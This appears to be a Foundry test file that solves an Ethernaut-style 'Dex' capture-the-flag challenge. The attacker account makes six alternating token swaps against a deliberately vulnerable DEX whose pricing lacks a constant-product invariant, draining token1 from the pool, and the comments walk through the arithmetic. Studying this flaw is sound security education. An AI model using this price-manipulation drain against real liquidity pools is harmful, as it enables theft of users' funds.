// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Dex, SwappableToken} from "../src/contracts/22_Dex.sol";

contract DexTest is Test {
    address private owner = makeAddr("owner");
    address private attacker = makeAddr("attacker");
    Dex private dex;
    SwappableToken private token1;
    SwappableToken private token2;

    function setUp() public {
        vm.startPrank(owner);

        dex = new Dex();
        token1 = new SwappableToken(address(dex), "Token 1", "TK1", 110);
        token2 = new SwappableToken(address(dex), "Token 2", "TK2", 110);

        dex.setTokens(address(token1), address(token2));

        token1.approve(owner, address(dex), 100);
        token2.approve(owner, address(dex), 100);

        dex.addLiquidity(address(token1), 100);
        dex.addLiquidity(address(token2), 100);

        token1.transfer(attacker, 10);
        token2.transfer(attacker, 10);

        vm.stopPrank();
    }

    function test_DexExploitVulnerability() public {
        // To solve this challenge we have to take advantage of the fact the there is no x * y = k invariant like in Uniswap V2
        // Without having such invariant we can easily drain one of the liquidity pools token1 or token2 in our Dex

        // Here is how I played it out
        /*
            ATTACKER                        DEX
            t1 - 10                       	t1 - 100
            t2 - 10 			            t2 - 100

            1. swap 10 t1 for t2 		    DEX
            t1 - 0				            t1 - 110
            t2 - 20				            t2 - 90

            2. swap 20 t2 for t1 		    DEX
            t1 - 24				            t1 - 86
            t2 - 0				            t2 - 110

            3. swap 24 t1 for t2		    DEX
            t1 - 0				            t1 - 110
            t2 - 30				            t2 - 80

            4. swap 30 t2 for t1		    DEX
            t1 - 41				            t1 - 69
            t2 - 0				            t2 - 110

            5. swap 41 t1 for t2		    DEX
            t1 - 0				            t1 - 110
            t2 - 65 			            t2 - 45

            6. swap 65 t2 for t1 		    DEX
            t1 - 158                        t1 - (-48)
            t2 - 0				            t2 - 110

            If we try to swap 65 t1 for t2 the transaction will revert beacuse the amount will exceed the balance we cannot take 158 tokens when there are 110 available
            we have to calculate how much t2 we need to swap, so that we drain the pool of token1 successfully
            we already have the formula from the DEX contract:
            swapAmount = amount * balanceOf(t1) / balanceOf(t2)
            110 = amount * 110 / 45
            amount = 45

            6. swap 45 t2 for t1            DEX
            t1 - 110                        t1 - 0
            t2 - 20                         t2 - 90
        */
        vm.startPrank(attacker);
        dex.approve(address(dex), 10);
        dex.swap(address(token1), address(token2), 10);
        dex.approve(address(dex), 20);
        dex.swap(address(token2), address(token1), 20);
        dex.approve(address(dex), 24);
        dex.swap(address(token1), address(token2), 24);
        dex.approve(address(dex), 30);
        dex.swap(address(token2), address(token1), 30);
        dex.approve(address(dex), 41);
        dex.swap(address(token1), address(token2), 41);
        dex.approve(address(dex), 45);
        dex.swap(address(token2), address(token1), 45);
        vm.stopPrank();

        assertEq(dex.balanceOf(address(token1), address(dex)), 0);
        assertEq(dex.balanceOf(address(token2), address(dex)), 90);
    }
}
